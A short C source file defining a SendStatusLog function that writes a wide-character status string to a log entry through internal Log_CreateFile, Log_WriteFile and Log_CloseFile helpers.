#include "H4-DLL.h"
#include "common.h"
#include "LOG.h"

#define PM_STATUSLOG 0x0241

void SendStatusLog(WCHAR *status_log)
{
	HANDLE hfile;
	hfile = Log_CreateFile(PM_STATUSLOG, NULL, 0);
	Log_WriteFile(hfile, (BYTE *)status_log, (wcslen(status_log)+1) * sizeof(WCHAR));
	Log_CloseFile(hfile);
}
